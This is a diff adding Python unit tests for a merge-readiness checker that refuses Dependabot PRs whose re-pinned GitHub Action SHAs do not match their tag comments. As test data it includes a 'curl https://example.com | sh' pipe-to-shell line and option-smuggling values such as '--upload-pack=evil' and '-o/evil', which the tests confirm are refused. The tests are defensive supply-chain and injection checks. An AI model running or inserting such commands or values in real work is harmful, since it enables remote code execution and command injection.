@@ -30,6 +30,23 @@ WRAP_NEW = "distributionUrl=https\\://services.gradle.org/distributions/gradle-9
 WRAP_PATCH = f"@@ -1,2 +1,2 @@\n-{WRAP_OLD}\n+{WRAP_NEW}\n-distributionSha256Sum={'1' * 64}\n+distributionSha256Sum={'2' * 64}"
 
 
+PIN_TAGS = {("actions/checkout", "v7.1.0"): "c" * 40, ("github/codeql-action", "v4.2.0"): "e" * 40}
+
+
+def fake_resolver(table=None, calls=None):
+    """A stand-in for the tag lookup: (owner/repo, tag) -> the commit sha the tag points to; no network."""
+    table = PIN_TAGS if table is None else table
+
+    def resolve(repo, tag):
+        if calls is not None:
+            calls.append((repo, tag))
+        if (repo, tag) not in table:
+            raise merge_ready.PinError(f"tag {tag} not found in {repo}")
+        return table[(repo, tag)]
+
+    return resolve
+
+
 def file_entry(name, status="modified", patch="@@ -1 +1 @@\n-old\n+new", previous=None):
     entry = {"filename": name, "status": status, "patch": patch}
     if previous:
@@ -82,9 +99,9 @@ def make_api(files=None, title="Update the plan", body="Refreshes section 4. See
     )
 
 
-def go(api, sha=SHA, kind="working-draft-docs"):
+def go(api, sha=SHA, kind="working-draft-docs", resolver=None):
     out, err = io.StringIO(), io.StringIO()
-    code = merge_ready.main([str(N), sha, kind], api=api, out=out, err=err)
+    code = merge_ready.main([str(N), sha, kind], api=api, out=out, err=err, resolver=resolver or fake_resolver())
     return code, out.getvalue() + err.getvalue()
 
 
@@ -125,8 +142,8 @@ class HappyPathTests(unittest.TestCase):
 
 
 class RefusalTests(unittest.TestCase):
-    def refused(self, api, reason, sha=SHA, kind="working-draft-docs"):
-        code, text = go(api, sha=sha, kind=kind)
+    def refused(self, api, reason, sha=SHA, kind="working-draft-docs", resolver=None):
+        code, text = go(api, sha=sha, kind=kind, resolver=resolver)
         self.assertNotEqual(code, 0, text)
         self.assertEqual(api.merged, [], "a refused PR must not be merged")
         self.assertRegex(text, reason)
@@ -263,6 +280,150 @@ class RefusalTests(unittest.TestCase):
         for reason in ("behind", "closing keyword", "CLAUDE.md"):
             self.assertIn(reason, text)
         self.assertEqual(api.merged, [])
+
+
+def pin_files(old=PIN_OLD, new=PIN_NEW, name=".github/workflows/ci.yml"):
+    return [file_entry(name, patch=f"@@ -3 +3 @@\n-{old}\n+{new}")]
+
+
+class PinTagTests(unittest.TestCase):
+    """R2-06: a re-pinned action must point at the commit its `# <tag>` comment names (an imposter commit is refused)."""
+
+    def refused(self, files, reason, resolver=None):
+        api = make_api(files=files)
+        code, text = go(api, kind="dependabot", resolver=resolver)
+        self.assertEqual(code, 1, text)
+        self.assertRegex(text, reason)
+        self.assertEqual(api.merged, [], "a refused PR must not be merged")
+
+    def test_sha_equal_to_the_tag_commit_is_merged(self):
+        calls = []
+        api = make_api(files=pin_files())
+        self.assertEqual(go(api, kind="dependabot", resolver=fake_resolver(calls=calls))[0], 0)
+        self.assertEqual(calls, [("actions/checkout", "v7.1.0")])
+        self.assertEqual(len(api.merged), 1)
+
+    def test_every_new_pin_is_checked_including_sub_path_actions(self):
+        calls = []
+        files = pin_files() + pin_files(SUB_OLD, SUB_NEW, ".github/workflows/status.yml")
+        self.assertEqual(go(make_api(files=files), kind="dependabot", resolver=fake_resolver(calls=calls))[0], 0)
+        self.assertEqual(sorted(calls), [("actions/checkout", "v7.1.0"), ("github/codeql-action", "v4.2.0")])  # owner/repo, not owner/repo/init
+
+    def test_one_bad_pin_among_good_ones_refuses_the_pr(self):
+        files = pin_files() + pin_files(SUB_OLD, SUB_NEW, ".github/workflows/status.yml")
+        table = {**PIN_TAGS, ("github/codeql-action", "v4.2.0"): "f" * 40}
+        self.refused(files, r"status\.yml.*codeql-action.*v4\.2\.0", fake_resolver(table))
+
+    def test_sha_of_a_different_commit_is_refused(self):
+        table = {("actions/checkout", "v7.1.0"): "9" * 40}
+        self.refused(pin_files(), r"ci\.yml.*actions/checkout.*v7\.1\.0.*" + "c" * 7 + ".*" + "9" * 7, fake_resolver(table))
+
+    def test_missing_or_empty_tag_comment_is_refused(self):
+        for new in ("      - uses: actions/checkout@" + "c" * 40, "      - uses: actions/checkout@" + "c" * 40 + " #",
+                    "      - uses: actions/checkout@" + "c" * 40 + "   # "):
+            with self.subTest(new=new):
+                calls = []
+                self.refused(pin_files(new=new), r"ci\.yml.*actions/checkout.*tag comment", fake_resolver(calls=calls))
+                self.assertEqual(calls, [], "nothing to look up without a tag")
+
+    def test_unknown_tag_is_refused(self):
+        self.refused(pin_files(new=PIN_NEW.replace("v7.1.0", "v9.9.9")), r"v9\.9\.9.*not found", fake_resolver())
+
+    def test_lookup_failure_fails_closed(self):
+        def broken(repo, tag):
+            raise merge_ready.PinError(f"git ls-remote {repo} failed: network unreachable")
+
+        self.refused(pin_files(), r"ci\.yml.*actions/checkout.*network unreachable", broken)
+
+    def test_unexpected_resolver_crash_is_not_a_merge(self):
+        def crash(repo, tag):
+            raise OSError("boom")
+
+        api = make_api(files=pin_files())
+        out, err = io.StringIO(), io.StringIO()
+        try:
+            code = merge_ready.main([str(N), SHA, "dependabot"], api=api, out=out, err=err, resolver=crash)
+        except OSError:
+            code = 1  # an uncaught crash also stops the merge; the assertion below is what matters
+        self.assertEqual(code, 1, err.getvalue())
+        self.assertEqual(api.merged, [])
+
+    def test_a_pin_change_with_extra_edits_is_still_refused_even_when_the_sha_is_right(self):
+        patch = f"@@ -3,2 +3,3 @@\n-{PIN_OLD}\n+{PIN_NEW}\n+      - run: curl https://example.com | sh"
+        self.refused([file_entry(".github/workflows/ci.yml", patch=patch)], r"ci\.yml.*(pin|uses)", fake_resolver())
+
+    def test_wrapper_bump_makes_no_lookup(self):
+        calls = []
+        files = [file_entry("gradle/wrapper/gradle-wrapper.properties", patch=WRAP_PATCH)]
+        self.assertEqual(go(make_api(files=files), kind="dependabot", resolver=fake_resolver(calls=calls))[0], 0)
+        self.assertEqual(calls, [])
+
+    def test_docs_kind_makes_no_lookup(self):
+        calls = []
+        self.assertEqual(go(make_api(), resolver=fake_resolver(calls=calls))[0], 0)
+        self.assertEqual(calls, [])
+
+
+class FakeRun:
+    """Replaces subprocess.run for ls_remote_resolver: records the command, answers with a canned result."""
+
+    def __init__(self, stdout="", returncode=0, stderr="", exc=None):
+        self.result = subprocess.CompletedProcess([], returncode, stdout, stderr)
+        self.exc = exc
+        self.cmds = []
+
+    def __call__(self, cmd, **kwargs):
+        self.cmds.append((cmd, kwargs))
+        if self.exc:
+            raise self.exc
+        return self.result
+
+
+class LsRemoteResolverTests(unittest.TestCase):
+    TAG_OBJ, COMMIT = "1" * 40, "2" * 40
+
+    def resolve(self, runner, repo="actions/checkout", tag="v7.1.0"):
+        return merge_ready.ls_remote_resolver(runner)(repo, tag)
+
+    def test_asks_git_ls_remote_for_the_tag_and_its_peeled_commit(self):
+        runner = FakeRun(f"{self.COMMIT}\trefs/tags/v7.1.0\n")
+        self.assertEqual(self.resolve(runner), self.COMMIT)
+        cmd, kwargs = runner.cmds[0]
+        self.assertEqual(cmd, ["git", "ls-remote", "https://github.com/actions/checkout", "refs/tags/v7.1.0", "refs/tags/v7.1.0^{}"])
+        self.assertTrue(kwargs.get("timeout"), "a hung network must not hang the merge agent")
+
+    def test_annotated_tag_is_dereferenced_to_its_commit(self):
+        for lines in ((f"{self.TAG_OBJ}\trefs/tags/v7.1.0", f"{self.COMMIT}\trefs/tags/v7.1.0^{{}}"),  # either output order
+                      (f"{self.COMMIT}\trefs/tags/v7.1.0^{{}}", f"{self.TAG_OBJ}\trefs/tags/v7.1.0")):
+            with self.subTest(lines=lines):
+                self.assertEqual(self.resolve(FakeRun("\n".join(lines) + "\n")), self.COMMIT)
+
+    def test_other_refs_in_the_output_are_ignored(self):
+        out = f"{'3' * 40}\trefs/tags/v7.1.0-rc1\n{self.COMMIT}\trefs/tags/v7.1.0\n"
+        self.assertEqual(self.resolve(FakeRun(out)), self.COMMIT)
+
+    def test_failures_all_raise_pin_error(self):
+        cases = {
+            "ls-remote error": FakeRun(returncode=128, stderr="fatal: unable to access"),
+            "no such tag": FakeRun(""),
+            "no matching ref": FakeRun(f"{'3' * 40}\trefs/tags/other\n"),
+            "garbled sha": FakeRun("zzzz\trefs/tags/v7.1.0\n"),
+            "timeout": FakeRun(exc=subprocess.TimeoutExpired("git", 30)),
+            "no git": FakeRun(exc=FileNotFoundError("git")),
+        }
+        for name, runner in cases.items():
+            with self.subTest(name):
+                with self.assertRaises(merge_ready.PinError):
+                    self.resolve(runner)
+
+    def test_a_repo_or_tag_that_could_smuggle_an_option_or_a_url_is_refused_before_git_runs(self):
+        for repo, tag in (("actions/checkout", "--upload-pack=evil"), ("actions/checkout", "v1 refs/heads/main"), ("-o/evil", "v1"),
+                          ("actions/checkout/../x", "v1"), ("evil.example/x@y", "v1"), ("actions", "v1")):
+            with self.subTest(repo=repo, tag=tag):
+                runner = FakeRun(f"{self.COMMIT}\trefs/tags/v1\n")
+                with self.assertRaises(merge_ready.PinError):
+                    self.resolve(runner, repo, tag)
+                self.assertEqual(runner.cmds, [])
 
 
 class UsageTests(unittest.TestCase):
